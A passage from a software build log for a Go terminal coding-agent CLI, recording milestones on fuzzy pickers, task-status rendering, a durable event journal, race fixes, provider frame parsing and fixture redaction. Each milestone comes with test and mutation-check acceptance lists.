`agent [i/n] · model · effort · state: summary — step`. The controller rejects a nonzero sequence
that is not newer than the current row, so a delayed callback cannot redraw an old waiting state over
current work. Whole rows use only fixed semantic styles: muted queued, yellow waiting/blocked,
purple working, green done, and red failed; the visible state word remains present when colour is
disabled.

Acceptance:

- [x] row tests prove bullet grammar, one-line terminal-safe truncation, summary plus latest step,
  stable plan order, and semantic styles for every closed state.
- [x] the CLI-to-runtime adapter explicitly carries step and sequence through its race-safe boundary.
- [x] accepting an older per-task sequence, flattening every row to muted purple, and dropping the
  `Step` adapter field each fail their exact regression and were reverted.
- [x] full TUI normal and `-race` suites, full CLI suite, and `git diff --check` pass.

### H10.5b1 built — durable replay follows the journal, not scheduler completion order

`PlainRenderer` now understands `work.updated`. It writes each supplied frame immediately rather
than collecting or sorting it: a parent appears as `◆ main · phase · state: step`; a child uses the
same compact task coordinates, model, effort, state, and step grammar as the live surface but does
not invent a planner title the standalone frame does not carry. This makes a session-journal replay
read as the durable record it is.

Acceptance:

- [x] a deliberately non-plan-ordered sequence of main, child-waiting, and child-working frames
  produces exactly those three concise lines in supplied journal order.
- [x] removing the `work.updated` dispatch makes the replay regression fail; the mutation was
  reverted.
- [x] full TUI normal and `-race` suites plus `git diff --check` pass.

### H10.5b2 built — real-time completion stays real-time; verbose reports stay readable

When a child resolves, the engine immediately emits a concise completion, failure, or incomplete
milestone in actual completion order. Its already-private output buffer is retained, then every
buffered child report is flushed after delegation in ascending plan index. This changes no task
launch decision, dependency resolution, writer lock, or buffered transport: it only chooses when
the existing complete buffers reach the shared terminal.

Acceptance:

- [x] a deterministic slow task 1 and fast task 2 prove task 2's completion milestone arrives
  first, while the verbose `slow` report still prints before the verbose `fast` report.
- [x] removing the deferred plan-order flush makes that regression fail; the mutation was reverted.
- [x] full engine normal and `-race` suites plus `git diff --check` pass.

### H10.5c built — display fallbacks preserve meaning and now have a race-free palette

The final display boundary proves that a semantic state is still written as text when `NO_COLOR`
removes every ANSI sequence, and that an agent row clips on terminal cells without adding a newline
or exceeding a narrow frame. Standalone durable milestone fields are sanitised and bounded again at
the plain-renderer boundary, so a hostile replay frame cannot use terminal controls or a long step
to escape its one-line surface. The race pass also found and fixed a real issue: a deferred runtime
repaint could read the process palette while `SetPalette` wrote it. Palette selection and lookup now
share a small read/write lock.

Acceptance:

- [x] `NO_COLOR` keeps the explicit waiting state and latest step while emitting no ANSI; a 42-cell
  frame clips a long agent row safely; hostile durable model/effort/step text stays single-line,
  control-free, meaningful, and bounded.
- [x] re-enabling the palette for `none`, bypassing row clipping, and bypassing durable-step
  sanitisation each fail their dedicated regression and were reverted.
- [x] removing palette synchronization reproduces a real race between `SetPalette` and deferred
  frame rendering; restoration makes the full TUI `-race` suite pass.
- [x] full TUI normal/race and CLI suites plus `git diff --check` pass.

### H10.6a built — the task ledger survives the reader that falls behind

The durable work journal now has an end-to-end recovery regression, not only independent bus and
status tests. Two concurrent child tasks publish into a one-event replay window backed by a spill
file while an intentionally unread live subscriber has a one-event buffer. The run must finish
within two seconds; the unread subscriber is disconnected with `ErrSlowSubscriber` and can later
resume from its cursor. Reopening the same session replays every child update from disk, with each
task retaining its own task ID, child turn, coordinates, strictly increasing per-task sequence, and
terminal `done/complete` state.

Acceptance:

- [x] focused normal and `-race` runs pass for
  `TestConcurrentTaskWorkSurvivesSpillReopenAndSlowSubscriber`, and `git diff --check` passes.
- [x] replacing non-blocking live fan-out with a direct channel send triggers only this regression's
  bounded slow-subscriber timeout; the mutation was reverted.
- [x] omitting spilled `work.updated` frames makes its recovered-ledger assertion fail; the mutation
  was reverted byte-identical.

### H10.6b built — exceptional boundaries do not erase the work trail

The retry and cancellation boundaries already prove their durable work semantics at the actual
provider and turn boundaries: each physical retry contributes one new observed provider step, while
a cancelled turn emits exactly one failed/complete parent row with `cancelled`, one
`turn.cancelled`, and no normal finish. This leaf closes the missing route-fallback proof. An
unstartable cheap child now has a regression that reads the bus rather than only the live callback:
its one task ledger records queued, started, cheap-provider opening, the named ceiling fallback,
ceiling-provider opening, then a terminal done row; identity and sequence remain continuous.

Acceptance:

- [x] focused normal and `-race` runs cover retry observation, durable child fallback, and parent
  cancellation; `git diff --check` passes.
- [x] omitting `updateSubagentStatusRoute` removes the fallback frame and leaves the next provider
  open on the old model, causing only the durable fallback regression to fail; the mutation was
  reverted.

### H10.6c built — a resize cannot rewrite what a task means

The runtime now has an integration regression over its actual paced render and resize path. It
receives task 2 before task 1, then reflows wide → narrow → wide while each row contains oversized
and terminal-hostile planner/provider fields. At every size, the frame keeps task 1 before task 2,
keeps explicit `working` and `waiting` state words, remains within terminal width, and contains no
control input. The immutable runtime snapshot proves that resize did not mutate order or state.

Acceptance:

- [x] focused normal runtime-resize plus runtime-update `-race` checks pass, and `git diff --check`
  passes.
- [x] bypassing agent-row clipping overflows the resized frame; bypassing final task-field
  sanitisation exposes the injected CSI sequence. Both mutations fail the new runtime regression and
  were reverted.

### H10.7a verified — affected producers, journal, adapters, and surfaces agree

The changed concurrency and protocol boundaries pass together: bus, engine, TUI, CLI, provider,
provider-agentcli, and protocol test packages are green normally and with Go's race detector. The
specification gate is also green with 29 checks, so the new event/schema contract and the runtime
projection are checked from both sides of the boundary.

### H10.7b verified — the repository-wide gate is green at 2,946 tests

The first canonical gate exposed a genuine ambient-state weakness in the Saga resolver: a stale
`/tmp/SAGA.md` was inherited by every temporary child directory. The resolver now stops non-Git
ancestor discovery at a world-writable boundary, while retaining normal non-Git project-ancestor
discovery; the new red regression proves both sides. The same gate then exposed the unreferenced
`streamChatOn` forwarding wrapper left after observed-progress wiring. Removing that dead unexported
wrapper restored the lint closure without changing call behavior.

Acceptance:

- [x] the shared-directory boundary mutation makes only its Saga isolation regression fail; it was
  reverted. Both shared-boundary refusal and ordinary non-Git ancestor discovery are covered.
- [x] final `TMPDIR=/var/tmp make check` passes: 2,946 tests, 0 lint issues, all four platform
  compile matrices, budgets, site/surface/installer, spec, release, workflow, plan, and pin gates
  green.

### H10.7c verified — the handoff has no hidden state

The final audit found no temporary mutation, formatting drift, or unintended scratch artifact. The
tracked H10 changes are the ledger/protocol/producers/projection/docs plus the gate-discovered Saga
shared-directory boundary; the untracked files are the new ledger, progress, tool-work, scheduler,
and protocol/schema tests and fixtures. `docs/build-log.md` now holds the durable verification
record. No commit, tag, push, or release was created: those remain the user's separate decision.

### H9 built — the green gate had two real gaps left in it

The first full gate after H8 exposed two defects that focused tests had not: an obsolete exported
`SubscriptionModelShortcut` was now test-only after plan-aware callers replaced it, and the
context-cancellation path in `LinesProcess` could SIGKILL a provider before its custom SIGINT-first
ladder ran. The latter was a real race: the reader saw the cancelled context and killed immediately
while `exec.CommandContext` was starting the ladder.

The session package now validates every session ID before it becomes a filesystem path, and verifies
that a decoded session ID matches the filename that supplied it. The provider reader waits for the
cancellation ladder to reap a cancelled child, while non-cancellation reader failures still kill and
reap immediately. The obsolete model-only shortcut was removed because shared GPT-5.6 model IDs need
their `ChatGPT Plus/...` or `ChatGPT Pro/...` plan qualification. The previously declared but empty
`workflow-pin-check` Make target now invokes its existing 43-check script.

The Codex failure was also separated into its two observed forms. The old `bufio.Scanner: token too
long` path is absent from the current provider reader, and exact first-turn and resume invocations
with `gpt-5.6-sol` succeeded on the installed signed-in CLI. `Reading prompt from stdin...` is a
provider stderr line from a nonzero exit, not evidence that the current Kolkrabbi reader rejected a
large frame.

Acceptance checklist:

- [x] session traversal and filename/decoded-ID mismatch regressions pass.
- [x] the SIGINT-first cancellation test passes repeatedly, including under `-race`.
- [x] all affected package race tests pass; full `make check` passes with **2,802 tests**, 0 lint
  issues, platform compilation, release, plan, smoke, and workflow-pin gates green.
- [x] no commit or release tag was created in this checkpoint.

### H8 built — a valid large Codex frame no longer looks like an authentication failure

The first live use of the newly routed Codex plan model failed before any event reached the
translator: `bufio.Scanner` rejected a provider JSONL line above its arbitrary 1 MiB buffer and
surfaced the opaque `bufio.Scanner: token too long`. The error appeared beside sign-in guidance,
so it looked like an authentication problem even though the connector was already enabled.

The one-shot and persistent provider readers now share a bounded `bufio.Reader.ReadSlice` framing
loop. It accepts provider lines through 16 MiB, including the large tool-result lines Codex emits,
and returns a named bounded-output error above that limit. Reader failures kill and reap the whole
provider process group; the red reproduction also exposed that killing only the shell leader left
a pipeline child holding stdout open.

Model selection had two independent usability gaps. Bare `/model` in the plain REPL depended on
the API catalog and gave no plan choices when that request failed, and the TUI picker emitted an
effort suffix that the slash dispatcher treated as part of the model id. Bare `/model` and
`kolk model` now print subscription choices with exact ids, `claude-pro`/`claude-max` and
`gpt-plus`/`gpt-pro` shortcuts, plus the exact sign-in command when needed. `/model <id|alias>
<effort>` now applies the model, session effort, and provider backend together. Shell completion,
help, welcome text, and TUI row labels use the same vocabulary; ordinary aliases such as `flash`
retain their existing API routing.

The race gate found one adjacent ownership defect: a raw PTY child and a pending TUI renderer
could write the same output writer concurrently. Runtime now gives both paths one synchronized
writer, preserving escape-sequence boundaries and making embedded non-thread-safe writers safe.

**Verification:** `go test ./... -count=1`, `go vet ./...`, `make lint`, package race tests for
`internal/shell`, `internal/provider`, `internal/provider/agentcli`, `internal/tui`, and
`internal/cli`, and `make check` all pass. `make check` reports 2,780 tests, 0 lint issues,
9.30 MB binary, 3.4 ms cold-start p50, and all site/surface/installer/spec/release/workflow/
verifier/smoke/plan gates green. No release tag or commit was created in this checkpoint.

### H7 built — a gap that predates this group, surfaced by merging with work that makes it likelier

`main` diverged from `origin/main` for both branches' entire duration: this group (H0–H6) on one
side, a PTY-based provider-login feature (`RunAttached`) and new agentic/subagent orchestration on
the other. `git merge-tree` reported the merge as textually clean — no conflict markers, both sides
touched `controller.go`/`runtime.go` without colliding on the same lines — but a clean text merge is
not a proof of correctness, and reviewing the merged `runtime.go` by hand rather than trusting the
green diff is what found this.

**Five separate places can claim exclusive ownership of the terminal's input: `Question`,
`Approval`, the `/model` picker, the `/config` picker, and now `RunAttached`'s raw PTY forwarding.**
Each was added at a different time, by a different piece of work, and each guarded only against the
ones that already existed *when it was written* — never against the ones added afterward:

- `Ask` (Question) and `Decide`/`Confirm` (Approval) predate `modelPick`/`configPick` entirely (H3),
  and were never revisited when those were added.
- `AskModel`/`AskConfig` correctly check all four overlay fields — because they were written last,
  with the others already in front of them — but neither checks `attached`, which did not exist yet.
- `RunAttached` (new in the merged branch) only refuses a *second* attach; it does not check any of
  the four overlay fields, because from that branch's perspective none of them existed either.

**The failure mode is a hang, not a crash, which is why nothing had found it.** While `attached` is
set, the read loop forwards raw bytes straight to the child and never calls `HandleKey` at all
(`runtime.go`'s read loop, `if sink != nil { ...; continue }` before key decoding). While any picker
is open, `Controller.HandleKey` checks `modelPicker`/`configPicker` ahead of `question`/`approval`.
Either way, an overlay opened on top of another exclusive state receives no keys, ever, and the
`select` blocking on its reply channel waits until its caller's context is cancelled — which, for a
subagent's own turn context, may be a very long time. The newly-merged agentic orchestration
(concurrent subagents, each capable of asking a question or requesting approval on its own turn)
makes two of these five colliding is now a real scenario rather than a theoretical one, which is why
this was worth fixing now rather than filing for later.

**The fix is the same four-line change repeated at all five entry points**: `Ask`, `Decide`,
`AskModel`, `AskConfig`, and `RunAttached` each now refuse when *any* of the other four are active,
not just the ones that predate them. `RunAttached` keeps its own `ErrAlreadyAttached` sentinel
return (rather than adopting `AskModel`'s bare `bool`) since that is the contract its own existing
callers and tests already depend on.

Acceptance checklist:

- [x] red first, and safely red: each of the six new tests runs its blocking call on its own
  goroutine with a bounded `select`/timeout, specifically so a still-buggy guard times out that one
  test rather than hanging the whole suite — the failure observed was the actual hang the bug
  describes (`"blocked instead of refusing"`), not a compile error.
- [x] every new clause in every fixed guard proven non-vacuous individually: `Decide`'s three new
  conditions (question, modelPick, configPick) each mutation-tested by removing just that one
  clause and confirming exactly its own test fails, all three others staying green; `RunAttached`'s
  modelPick clause and `AskModel`'s attached clause likewise. Five targeted mutations, five clean
  catches, all reverted to byte-identical diffs.
- [x] `-race` green across `internal/tui`.
- [x] full `make check` green: **2,700 tests, 0 lint issues**, release/plan/spec guards all passing.

### H0 built — one scoring term turned out to be free

`fuzzyScore`/`fuzzyMatches` (`internal/tui/fuzzy.go`) report whether every whitespace token of a
query is a case-insensitive **subsequence** of a haystack — not a contiguous substring — in any
order across tokens, preserving `matchesFilter`'s own reason to exist ("claude max" and "max
claude" both find the row). `ok` alone is what `matchesFilter`'s callers need; `score` is new, for
ranking, so the row meant is usually already on top rather than three arrow-presses down.

**The first draft scored three things; only two turned out to matter.** A word-boundary bonus for
where a match starts, a contiguity bonus for characters landing right after each other, and a
gap penalty for characters that do not. Mutating away the gap penalty or the boundary bonus each
failed a test. Mutating away the contiguity bonus failed **nothing** — because a fully contiguous
run already costs zero gap-penalty, which already beats a scattered run's negative one. The bonus
was reproducing an effect the penalty already produced. Rather than write a test to justify keeping
it, the term was deleted: the two-component version passes the identical seven tests and mutation
now catches a defect in both remaining pieces of logic, with nothing left unproven.

Acceptance checklist:

- [x] red first: `go test -run TestFuzzy` failed to compile against `fuzzy_test.go` referencing
  functions that did not exist yet — the discipline this session had already broken once earlier by
  writing the implementation before its test, caught and undone before green.
- [x] every one of the seven tests proven non-vacuous: `boundaryBonus` zeroed fails the
  word-boundary ranking test; the gap-penalty neutralized (`score -= 0 * (...)`, keeping the
  variable read so the mutation is a behavior change and not a compile error) fails the
  tighter-run-beats-scattered test. Both revert to a byte-identical diff.
- [x] `-race` green across `internal/tui`.
- [x] full `make check` green: **2,614 tests, 0 lint issues**.

### H1 built — joining fields for a fuzzy search reopened the bug the join was meant to prevent

Every place a picker filtered a list — `SuggestCommands`, `SuggestModels`, `SuggestPlanLogins`,
`SuggestSettings`, `SuggestFiles` — now routes through H0's primitive, ranked by score. `matchesFilter`
is deleted, not deprecated: nothing calls it, so nothing was left to drift out of sync with the
thing that replaced it.

**Ten new red tests, one surprise.** Nine were the expected shape: a query whose characters are a
scattered subsequence, not a contiguous run, now finds the row a literal-substring match could not
— `/cfg` finds "config", `/model cld` finds "claude-opus", `@mdl` finds "model.go". The tenth —
`/config eff` against a settings list — went **red on a passing suite**, not a missing feature: it
matched "auto_restart_after_update" as well as the "effort" it was supposed to.

**The cause was `matchesFilter`'s own field-joining, ported over unexamined.** `SuggestSettings`
had always matched a key, a summary and a value by joining them with spaces into one haystack — a
design that carries a hidden assumption: the query, once split into tokens, will never itself find
a match by threading through the join between two unrelated fields. Literal substring matching
happens to keep that assumption honest, because a real cross-field literal run is vanishingly rare
in natural text. Subsequence matching does not: `auto_restart_after_update` and `restart into the
new version after an update` each carry exactly one letter `f`. Joined, "eff" is a valid subsequence
— one `e` and one `f` from the key, a second `f` borrowed from the summary three fields later. The
setting had nothing to do with effort; the letters just happened to line up.

**The fix keeps a property H1 could not give up: a query's words may still land in different
fields.** `SuggestPlanLogins` depends on "anthropic max" finding a plan whose provider is
"anthropic" and whose name is "Claude Max" — a real, load-bearing cross-field case, not the bug.
So the fix is not "search one field at a time" but "let one *token* land in a field, never let a
*token's own subsequence* span two of them": `fuzzyScoreFields` tries each token against every
field independently and keeps the best field's score, rather than concatenating the fields first.
Cross-token, cross-field distribution stays possible; cross-field spanning inside a single token
does not. `fuzzyScore` itself is now `fuzzyScoreFields` called with one field, removing the
duplicated token loop rather than maintaining two copies of it.

**A malformed mutation is recorded, again, rather than quietly redone.** The first attempt at
proving `fuzzyScoreFields`'s field-isolation mattered reverted it to call `fuzzyScore` on the
joined string — forgetting that `fuzzyScore` now delegates *back* to `fuzzyScoreFields`, producing
infinite mutual recursion and a stack-overflowing test run instead of a result. Discarded as a
broken experiment, not counted as evidence, and redone by inlining the join directly.

Acceptance checklist:

- [x] red first: ten tests, nine failing on missing tolerance, one failing on a passing suite by
  matching a row it should not have — the more informative kind of red, since it disproved an
  assumption rather than confirming an absence.
- [x] a new primitive, `fuzzyScoreFields`, with its own three tests proving the specific contract a
  naive join would violate: a token must not span two fields; different tokens may still land in
  different fields; a token entirely within one field still matches there.
- [x] seven wiring mutations, one per call site plus the field-isolation fix itself, each reverted
  to a byte-identical diff: reverting any one call site to its pre-H1 matcher fails only the
  test(s) written for that surface, leaving every other picker's tests green — proof the leaf did
  not accidentally share behavior between surfaces that happen to look similar.
- [x] `-race` green across `internal/tui`.
- [x] full `make check` green: **2,623 tests, 0 lint issues**.

### H2 built — two small pieces, not one shared skeleton, and why the plan changed on contact

The queue line above committed to an embedded `*Editor` for a filterable overlay's query line.
That was wrong, and wrong for a reason worth recording rather than quietly overwriting: `Editor`'s
`Up`/`Down` do history navigation and vertical cursor movement, and `Left`/`Right` move the text
cursor — but a filterable overlay's `Up`/`Down` mean "select the next row", and `/model`'s own
`Left`/`Right` already mean "cycle this row's effort" by the owner's own decision at the top of
this group. There is no cursor position left over for `Editor` to move, and no history for it to
navigate. Wrapping it and disabling most of what makes it `Editor` would not be reuse; it would be
carrying a multiline, history-aware input type into a role that has to refuse nearly everything it
does. `filterBox` is fifteen lines: append text, remove the last rune, report whether removing one
did anything. It is not a smaller `Editor` — it is the actual size of what a query line that only
ever appends and backspaces needs to be.

**This codebase has no generic container type anywhere** (checked: no `[T any]` in `internal/`),
and `ModelPick` and `Question` already do not share a base type despite looking structurally
similar — each is its own concrete row shape, its own key handler, its own line-builder. Following
that precedent, H2 does not introduce a `filterableOverlay[T]` either. What actually generalizes
across a future `/model` filter box and a future `/config` picker is not the row list — that
differs by picker — but exactly two pieces that do not: the query buffer (`filterBox`, above) and
the "scroll the least amount that keeps the selection visible" arithmetic every windowed list needs
regardless of what it is a list of.

**The second piece was not new; it was one line away from having a second author.** The suggestion
dropdown's `showSelectedSuggestion` already had this exact three-comparison rule inlined against
`c.suggestionTop`/`c.suggestionIndex`. Writing a second, textually-identical copy for the next
overlay rather than naming the first one and calling it twice is the specific duplication the
refactor gate exists to catch. `scrollWindow(selected, top, window int) int` is that rule extracted
to plain integers, and `showSelectedSuggestion` now calls it instead of carrying its own copy —
verified by the existing thirty-row scroll test passing unchanged, since the arithmetic did not
change, only where it lives.

Acceptance checklist:

- [x] red first: both `filterBox` and `scrollWindow` referenced by name before either existed.
- [x] the refactor is behavior-preserving, not a new feature: `TestSuggestionListScrollsThroughTheWholeCatalog`
  (30-row catalog, arrow-key walk, scroll-indicator assertions) passes unchanged after
  `showSelectedSuggestion` was rewritten to call the extracted function.
- [x] proven non-vacuous by mutation: dropping `scrollWindow`'s upper-bound case fails both the new
  unit test and — because the function is genuinely shared, not merely tested in parallel — the
  pre-existing suggestion-dropdown scroll test too. Making `backspace` always report a change fails
  the empty-box test. Both revert to byte-identical diffs.
- [x] `-race` green across `internal/tui`.
- [x] full `make check` green: **2,627 tests, 0 lint issues**.

### H3 built — a row's identity and its position on screen had to stop being the same variable

The `/model` overlay could always be arrowed through; it could not be typed into. `c.modelIndex`
now indexes a **filtered, ranked view** of `c.modelPicker` — recomputed by `filteredModelIndices()`
from H0's `fuzzyScoreFields` on every keystroke — rather than the catalog itself, and typing or
Backspace narrows or widens that view live, exactly like every inline suggestion already did before
H1.

**The one bug worth naming: a row's identity and its screen position stopped being interchangeable
the moment filtering could reorder or hide rows, and the effort dial was still written as though
they were the same thing.** `KeyLeft`/`KeyRight` used to mutate `c.modelPicker[c.modelIndex]`
directly, which was safe only because the displayed order and the catalog order were always
identical. Once a filter could show a *different* row at index 0 than the catalog's own row 0, that
line would turn the *wrong model's* effort — silently, since both reads succeed and nothing panics
if the row it hits happens to have its own `Efforts` slice. Fixed by keeping `modelPicker` as the
one source of truth and never touching it except through
`c.modelPicker[indices[c.modelIndex]]`, where `indices` is the current filtered view. Mutation
confirms this by reverting to the direct index: turning the dial on a filtered single-claude view
silently turns "vendor/mock"'s (absent) dial instead, and the claude row's effort never moves.

**A second bug in the same family, caught only because a test went looking for it rather than
happening to trip over it.** Moving the marker down an unfiltered list and then typing a filter
that narrows the list below the marker's raw position — reproduced directly by
`TestModelPickerResetsTheMarkerWhenTheFilterNarrowsPastIt` — needs the marker reset on every
keystroke, or `indices[c.modelIndex]` reads past the end of a list that just got shorter. The reset
line already existed when this session wrote the leaf; what did not exist was a test requiring it,
and mutating it away passed the whole suite silently until this test was written specifically to
require it. Recorded the same way H0's dead scoring term was: a mutation surviving is a claim about
missing coverage, chased down rather than left alone because the rest of the suite was green.

**Escape backs out one step, matching fzf and every fuzzy picker this group is meant to resemble:**
an active filter clears first; the overlay closes only once there is nothing left to clear. This
was one of the two decisions the owner made explicit before any of H's code was written, so it is
implemented exactly as scoped rather than re-litigated here.

Acceptance checklist:

- [x] red first: `pick.Filter` referenced in four new tests before `ModelPick` had the field.
- [x] the effort-dial identity bug caught by mutation: reverting to direct-index mutation passes
  every pre-existing test and fails only `TestModelPickerEffortDialSurvivesFiltering` — proof the
  bug is real and specific to filtering, not a general regression the old tests would have caught
  anyway.
- [x] the marker-reset bug caught the same way, by a test written to specifically require it after
  mutation testing showed it was unproven.
- [x] `-race` green across `internal/tui`.
- [x] full `make check` green: **2,632 tests, 0 lint issues**.

### H4 built — the literal ask, and the one place its answer had to differ from `/model`'s

Bare `/config` in the TUI opened nothing: it fell straight through to `a.runConfig`, the
non-interactive dump `kolk config` itself prints. `ConfigPicker` (`internal/tui/config_picker.go`)
gives it the same overlay `/model` has — `filteredConfigIndices` filters and ranks `SettingSpec`
rows through H0's `fuzzyScoreFields` exactly the way `filteredModelIndices` does, and the whole
key-handling shape (type to filter, Backspace to edit, Escape clears-then-closes) is deliberately
the twin of H3's, because a person who has learned one picker in this app should not have to learn
a second set of rules for the other. No new CLI-side data plumbing was needed: `tuiSettings(a)`
already built exactly this row shape for the inline `/config` suggestions, so the picker's rows and
the dropdown's rows now come from the same call.

**The one place it could not just copy `/model`: what Enter does.** `/model`'s Enter answers with a
complete, ready-to-run command — the picker has resolved the whole choice. `/config`'s Enter cannot:
a setting still needs its **value** typed, and no picker in this app should try to guess it.
`resolveConfigPicker` therefore does not hand a string back up through the same reply-channel path
`/model` uses to submit a command — it calls the identical two lines `completeSuggestion` already
uses for the inline dropdown's own Tab-completion (`c.editor.setDraft(...)`, `c.screen.SetDraft(...)`)
and fills the composer with `/config set <key> `, leaving the user exactly where choosing the same
row from the dropdown already leaves them. One behavior for "a setting was chosen," however it was
reached, rather than a second one invented for the overlay.

**Wiring it into the CLI is one `else if` beside the existing `/model` check** (`tui_repl.go`'s
`Turn`), because `AskConfig` mirrors `AskModel`'s blocking contract exactly — same mutual-exclusion
guard extended in both directions (`AskModel` now also refuses to open over an active config picker,
and vice versa), same context-cancellation teardown. `/config get|set|unset <args>` never reaches
the new function at all: the guard is `prompt == "/config"` exactly, so the CLI's existing command
runs unchanged for every other shape.

**A second red-first slip in this same session, corrected the same way as the first.** The CLI
wiring (`tuiConfigPickerCommand`) was written and working before its two tests existed, so they
passed the moment they were written — never observed failing for their own reason. Caught on the
same self-check this session has been applying to every other leaf: each test's exact claim was
mutated away (the bare-`/config` guard forced to always refuse; the args-guard loosened to a
prefix check) and both were confirmed to fail for precisely the reason they exist, before being
trusted.

**A genuine data race, not a flake, in the CLI-layer test itself.** `internal/tui`'s own picker
tests read controller state directly under `r.mu` because they live inside the `tui` package;
`internal/cli`'s new test cannot reach that private field. Polling `screen.Controller().ConfigPicker()`
without it raced against `AskConfig` mutating the same state from the picker's own goroutine — caught
by `-race`, not by inspection. Fixed with `Runtime.ConfigPicker()`, a thin locked passthrough
mirroring the existing `Snapshot()`/`SetStatus()` pattern, rather than working around the race in the
test.

Acceptance checklist:

- [x] red first: `ConfigPicker`/`RequestConfigPicker`/`AskConfig` referenced by name before any of
  the three existed, at both the `internal/tui` and `internal/cli` layers.
- [x] mutation-proven at the `internal/tui` layer: no draft set on pick, a draft wrongly set on
  dismissal, fuzzy filtering disabled, and Escape always closing — four mutations, each caught by
  exactly the test written for it, each reverted byte-identical.
- [x] mutation-proven at the `internal/cli` layer, after the red-first slip was caught and
  corrected: the bare-`/config` guard forced to always-refuse, and the args-guard loosened to a
  prefix match — both fail for their intended reason, both reverted byte-identical.
- [x] the cross-package race caught by `-race`, fixed by adding a proper locked accessor rather
  than papering over it in the test; the fixed test run clean ten times in a row under `-race`.
- [x] `-race` green across `internal/tui` and `internal/cli`.
- [x] full `make check` green: **2,639 tests, 0 lint issues**.

### H5 built — infrastructure that named its own reason for existing, and then went unused

Found by re-reading H2's own commit rather than by anything failing: `scrollWindow` was built and
justified in the same sentence that named "a future `/model` filter box and a future `/config`
picker" as the reason it existed. Both shipped in H3 and H4 without ever calling it.
`filteredModelIndices`/`filteredConfigIndices` narrow and rank a catalog on every keystroke, but the
line-builders still rendered every surviving row — a settings list or model catalog longer than the
terminal's own height would overflow it the moment either overlay opened with no filter typed yet,
which is precisely the worse-than-arrow-keys failure this whole group exists to fix.

**Nothing tested this because nothing was asked to.** H3's and H4's own tests all used short lists —
two or three rows — so the gap was invisible to every test written for either leaf. This is the same
shape of finding as H0's dead scoring term and H3's marker-reset bug: a real gap survives not
because it is hard to catch, but because the coverage never looked at the case that would reveal it.

The fix mirrors the suggestion dropdown exactly: `modelTop`/`configTop` fields track the first
visible row, updated via `scrollWindow` on every key that moves the marker or changes the filtered
set, and `modelPickerLines`/`configPickerLines` now slice to `c.windowSize()` rows with `"  ↑"`/`"  ↓"`
indicators — the same visual language, the same fixed window size (not derived from the terminal's
actual height, matching the suggestion dropdown's own existing tradeoff rather than inventing a
second windowing scheme). `Question` is deliberately untouched: it is a fixed, small enumerated
menu the model itself proposes, not a searchable catalog, and was never in this leaf's scope.

Acceptance checklist:

- [x] red first, and red for a mistaken reason once: the first version of the scroll-past-the-end
  assertion undercounted how many `KeyDown`s it takes to reach the last row of fifteen — caught by
  reading the failure output, not by the mutation step.
- [x] proven non-vacuous by mutation on both overlays: dropping the window clamp, and separately
  dropping the `scrollWindow` call on `KeyDown`, each fail exactly the new test and leave every
  existing picker test (short lists, unaffected by windowing) green.
- [x] `-race` green across `internal/tui`.
- [x] full `make check` green: **2,641 tests, 0 lint issues**.

### S10.1c built — provenance becomes mechanical, and one artifact stops being contagious

Two of §10.1's defects were never really about the two files they were found in. **A1** — a README
naming `--allowedTools "Write"` for a capture whose `tool_use` block runs `Bash` — is what happens
when provenance is a sentence someone types afterwards. **A3** — a newline replaced by U+240A
SYMBOL FOR LINE FEED — is what happens when JSON is redacted by a line-oriented tool that cannot see
inside a string. Both recur on the next capture unless the capture itself changes.

**`scripts/capture-foreign.sh` writes the `.cmd` sidecar before it runs the vendor**, so a command
that fails still leaves its provenance behind, and one argv element per line so that
`--setting-sources ""` is unambiguous on the way back out. The vendor runs in a scratch directory,
never the checkout, because raw frames echo `cwd` and a capture taken inside the repository bakes
the maintainer's path in before redaction can reach it. Redaction runs through `jq`, which decodes
and re-encodes JSON strings — that is the whole of the A3 fix, and the script says in its header
never to use `sed` or `tr` here. UUIDs map to stable fakes by order of first appearance, so
re-capturing the same shape yields the same bytes and the diff stays readable. It refuses to
overwrite an existing fixture, and greps its own output for `$HOME` and the scratch path before
writing, because that is the exact mistake redaction exists to prevent.

**Proven on a probe carrying `\n`, `\t`, `\r\n`**, a private tool name, a real `$HOME` path and a
shim line: control characters came through as escapes, the tool list was genericised, the UUID was
stably mapped across two frames, and the non-JSON line was dropped and reported rather than
silently eaten.

**The synthetic fixture exists because the captures cannot carry this.** Their tool output is
already corrupted, so asserting against it would enshrine the cleaning. `synthetic/` is its own
directory, registered separately in the spec inventory, so "captured, therefore evidence" and
"hand-written, therefore not" cannot be confused by someone skim-reading the folder. Both
`tool_result` shapes are covered — a string and an array of blocks decode by different paths in
`flattenToolResult`, and only the first was ever exercised on real bytes.

Acceptance checklist:

- [x] argv recorded by the tool that ran it, not by a note afterwards.
- [x] redaction proven to preserve `\n`, `\t` and `\r\n` on a probe built for it.
- [x] the fixture test proven non-vacuous by mutation — reintroducing the exact A3 corruption in
  `flattenToolResult` fails it, and the reported diff is the original defect verbatim.
- [x] synthetic frames separated from captures by directory and by inventory entry, and the README
  says which is evidence and which is not.
- [x] full `make check` green: **2,532 tests, 0 lint issues**, spec guard 29 checks.

### S10.2 built — a fixture nobody replayed hid a dead code path

The two committed `claude-*` fixtures say, in their own README, that they exist so the translator
can replay real vendor output *"offline, forever"*. **Nothing replayed them.** They appeared in
exactly one place in the tree — a filename list in `protocol/contract_inventory_test.go` asserting
the files exist. The codex half of the same package does this properly: `codex_test.go` replays all
three of its fixtures in six places. The claude half never did.

**What that hid.** The vendor sends `rate_limit_event` with its payload nested under
`rate_limit_info` in camelCase — `{"rate_limit_info":{"status":"allowed_warning",
"rateLimitType":"seven_day","resetsAt":…}}` — which is what the captured fixture carries.
`wireFrame` declared those fields flat and snake_case at the top level. So on a real machine
`frame.Status` was always `""`, every rate-limit frame fell through the status check, and:

1. the plan warning never reached the user — nobody was told the seven-day window was 78% gone; and
2. `s.rejectedLimit` was never set, so `classifyLimitFailure` could not fire. The whole plan-limit
   classification path — including the wrapped-cause bug fixed hours earlier under S10 — was
   unreachable against real vendor output. A user hitting their Claude limit got a bare
   "credit balance too low" instead of the window and its reset time.

**Every existing test asserted the invented shape.** Five of them, across two files, hand-written
with flat snake_case JSON the vendor has never sent. They passed, and they were decoration: the
suite was testing this package's assumption against itself. That is the same vacuity A33.1 caught by
mutation, arrived at from the other direction — there the fixture was too easy, here the fixture was
never opened.

**The flat spelling is kept as a tolerated fallback, not deleted.** No vendor frame has carried it,
so it is not evidence of anything — but a rate-limit frame this package cannot read is a plan limit
the user never hears about, and tolerating an extra spelling costs four lines. It is pinned by its
own test so it stays a decision someone can find and delete rather than a shape that merely still
decodes.

Acceptance checklist:

- [x] the replay test written first and observed failing for its intended reason: **zero limit
  events from a real captured stream that contains exactly one**.
